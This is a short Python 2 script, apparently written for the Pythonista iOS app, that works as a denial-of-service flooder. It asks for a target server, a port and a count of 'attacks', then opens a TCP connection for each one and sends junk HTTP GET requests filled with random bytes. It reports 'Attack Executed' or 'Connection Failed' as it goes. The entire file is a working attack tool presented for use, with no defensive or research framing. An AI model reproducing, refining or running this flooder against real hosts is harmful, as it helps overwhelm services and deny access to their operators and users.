import time, socket, os, sys, string, random, console
console.set_color(255, 0, 0)
print("\n      -+--=:=- -==- -=:=--+-")
console.set_color()
print("             FEEDBACK")
console.set_color(255, 0, 0)
print("      -+--=:=- -==- -=:=--+-\n")
console.set_color()
host=raw_input(" -+- Server: ")
port=int(input(" -+- Port: "))
message=random._urandom(1024)
conn=input( " -+- Attacks:" )
ip = socket.gethostbyname( host )
def dos():
	ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		ddos.connect((host, int(port)))
		ddos.send( "GET /%s HTTP/1.1\r\n" % message )
		ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
		ddos.send( "GET /%s HTTP/1.1\r\n" % message )
	except socket.error, msg:
		console.set_color(255, 0, 0)
		print("-[Connection Failed]-=@=--+-")
		console.set_color()
	else:
		console.set_color(0, 130, 0)
		print ( "-[Attack Executed]-=:=--+-")
	console.set_color()
	ddos.close()
for i in xrange(conn):
	dos()
